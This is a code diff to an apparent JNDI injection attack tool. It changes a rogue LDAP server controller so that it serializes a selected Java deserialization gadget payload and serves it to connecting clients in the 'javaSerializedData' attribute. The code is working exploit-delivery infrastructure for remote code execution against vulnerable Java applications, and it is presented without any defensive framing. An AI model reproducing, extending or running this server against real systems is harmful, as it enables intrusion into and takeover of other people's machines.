@@ -12,6 +12,9 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+
 import static com.nu1r.jndi.gadgets.utils.Utils.getByte;
 import static com.nu1r.jndi.gadgets.Config.Config.IS_INHERIT_ABSTRACT_TRANSLET;
 import static com.nu1r.jndi.gadgets.Config.Config.URL_PATTERN;
@@ -19,9 +22,10 @@ import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/deserialization"})
 public class SerializedDataController implements LdapController {
-    private GadgetType  gadgetType;
-    private PayloadType payloadType;
-    private String[]    params;
+    private              GadgetType  gadgetType;
+    private              PayloadType payloadType;
+    private              String[]    params;
+    private static final int         USAGE_CODE = 64;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
@@ -30,7 +34,12 @@ public class SerializedDataController implements LdapController {
         final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
         ObjectPayload                        payload      = payloadClass.newInstance();
         Object                               object       = payload.getObject(payloadType, params);
-        byte[]                               bytes        = (byte[]) getByte(object);
+        //序列化
+        ByteArrayOutputStream                baous        = new ByteArrayOutputStream();
+        ObjectOutputStream                   oos          = new ObjectOutputStream(baous);
+        oos.writeObject(object);
+        byte[] bytes = baous.toByteArray();
+        oos.close();
 
         e.addAttribute("javaClassName", "foo");
         e.addAttribute("javaSerializedData", bytes);
